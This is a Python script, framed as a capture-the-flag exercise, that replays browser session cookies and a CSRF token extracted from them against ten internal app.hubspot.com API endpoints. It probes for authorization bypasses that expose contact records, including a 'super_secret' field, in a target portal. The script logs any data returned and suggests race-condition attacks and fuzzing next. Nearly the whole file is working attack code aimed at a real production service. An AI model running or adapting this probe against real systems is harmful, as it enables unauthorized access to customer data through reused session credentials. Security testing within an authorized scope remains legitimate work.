#!/usr/bin/env python3
"""
Session-Based CTF Attack
Uses browser cookies to test app.hubspot.com APIs for authorization bypasses
"""

import requests
import json
import sys
from config import HUBSPOT_COOKIES, TARGET_PORTAL_ID, get_api_key

def test_session_apis():
    """Test session-based APIs that might have weaker authorization"""

    if not HUBSPOT_COOKIES:
        print("[ERROR] No session cookies configured. Run with cookies from browser.")
        return

    print("="*70)
    print("SESSION-BASED CTF ATTACK")
    print(f"Target Portal: {TARGET_PORTAL_ID}")
    print("="*70)

    # Session headers
    session_headers = {
        'Cookie': HUBSPOT_COOKIES,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://app.hubspot.com/',
        'Origin': 'https://app.hubspot.com'
    }

    # Extract CSRF token from cookies
    csrf_token = None
    for cookie in HUBSPOT_COOKIES.split(';'):
        if 'hubspotapi-csrf=' in cookie or 'csrf.app=' in cookie:
            csrf_token = cookie.split('=')[1].strip()
            break

    if csrf_token:
        session_headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token
        print(f"[+] Using CSRF token: {csrf_token[:20]}...\n")

    # Test vectors for session-based APIs
    tests = [
        {
            "name": "Inbounddb-objects API - Contact 1",
            "url": f"https://app.hubspot.com/api/inbounddb-objects/v1/crm-objects/0-1/1",
            "params": {"portalId": TARGET_PORTAL_ID, "properties": ["firstname", "super_secret", "email"]}
        },
        {
            "name": "Inbounddb-objects API - No portal param",
            "url": f"https://app.hubspot.com/api/inbounddb-objects/v1/crm-objects/0-1/1",
            "params": {"properties": ["firstname", "super_secret", "email"]}
        },
        {
            "name": "Contacts App API - Contact 1",
            "url": f"https://app.hubspot.com/contacts-app/api/contacts/v1/contact/vid/1",
            "params": {"portalId": TARGET_PORTAL_ID}
        },
        {
            "name": "CRM Search via App",
            "url": f"https://app.hubspot.com/api/crm/v3/objects/contacts/search",
            "method": "POST",
            "body": {
                "filterGroups": [{"filters": [{"propertyName": "hs_object_id", "operator": "EQ", "value": "1"}]}],
                "properties": ["firstname", "super_secret", "email"],
                "portalId": TARGET_PORTAL_ID
            }
        },
        {
            "name": "Batch Read via App",
            "url": f"https://app.hubspot.com/api/crm/v3/objects/contacts/batch/read",
            "method": "POST",
            "body": {
                "properties": ["firstname", "super_secret", "email"],
                "inputs": [{"id": "1"}],
                "portalId": TARGET_PORTAL_ID
            }
        },
        {
            "name": "Direct Contact via App - Portal in URL",
            "url": f"https://app.hubspot.com/contacts/{TARGET_PORTAL_ID}/contact/1"
        },
        {
            "name": "Contact List via App",
            "url": f"https://app.hubspot.com/api/contacts/v1/lists/all/contacts/all",
            "params": {"portalId": TARGET_PORTAL_ID, "count": 10}
        },
        {
            "name": "Internal CRM API",
            "url": f"https://app.hubspot.com/api/crm-objects/v1/objects/contacts/1",
            "params": {"portalId": TARGET_PORTAL_ID, "properties": "firstname,super_secret,email"}
        },
        {
            "name": "Properties API via App",
            "url": f"https://app.hubspot.com/api/properties/v1/contacts/properties",
            "params": {"portalId": TARGET_PORTAL_ID}
        },
        {
            "name": "Contact Export API",
            "url": f"https://app.hubspot.com/api/contacts/v1/contact/vid/1/profile",
            "params": {"portalId": TARGET_PORTAL_ID}
        }
    ]

    findings = []

    for i, test in enumerate(tests, 1):
        print(f"\n[{i}/{len(tests)}] Testing: {test['name']}")
        print(f"    URL: {test['url'][:80]}...")

        try:
            method = test.get('method', 'GET')

            if method == 'POST':
                resp = requests.post(
                    test['url'],
                    json=test.get('body', {}),
                    headers=session_headers,
                    timeout=10
                )
            else:
                resp = requests.get(
                    test['url'],
                    params=test.get('params', {}),
                    headers=session_headers,
                    timeout=10
                )

            status = resp.status_code
            length = len(resp.text)

            print(f"    Status: {status}, Length: {length} bytes")

            # Check for success
            if status == 200:
                print(f"    [!!!] SUCCESS - 200 OK!")
                print(f"    Response preview: {resp.text[:300]}")

                # Try to parse as JSON
                try:
                    data = resp.json()
                    if 'properties' in str(data) or 'firstname' in str(data) or 'super_secret' in str(data):
                        print(f"    [!!!] POTENTIAL FLAG DATA FOUND!")
                        print(json.dumps(data, indent=2)[:1000])

                        findings.append({
                            'test': test['name'],
                            'url': test['url'],
                            'status': status,
                            'data': data
                        })
                except:
                    pass

            elif status not in [400, 401, 403, 404]:
                print(f"    [!] Unusual status: {status}")
                print(f"    Response: {resp.text[:200]}")

        except Exception as e:
            print(f"    [X] Error: {str(e)}")

    # Summary
    print("\n" + "="*70)
    print("SESSION ATTACK COMPLETED")
    print("="*70)

    if findings:
        print(f"\n[!!!] FOUND {len(findings)} POTENTIAL VULNERABILITIES:")
        for f in findings:
            print(f"  - {f['test']}: {f['url']}")

        # Save findings
        with open('findings/session_attack_results.json', 'w') as file:
            json.dump(findings, file, indent=2)
        print(f"\n[+] Results saved to: findings/session_attack_results.json")
    else:
        print("\n[-] No successful access found. All requests blocked.")

    print("\n[*] Next steps:")
    print("    1. Add GraphQL scope to your Private App")
    print("    2. Try race condition attacks")
    print("    3. Test with parameter fuzzing")

if __name__ == '__main__':
    try:
        test_session_apis()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted")
        sys.exit(0)
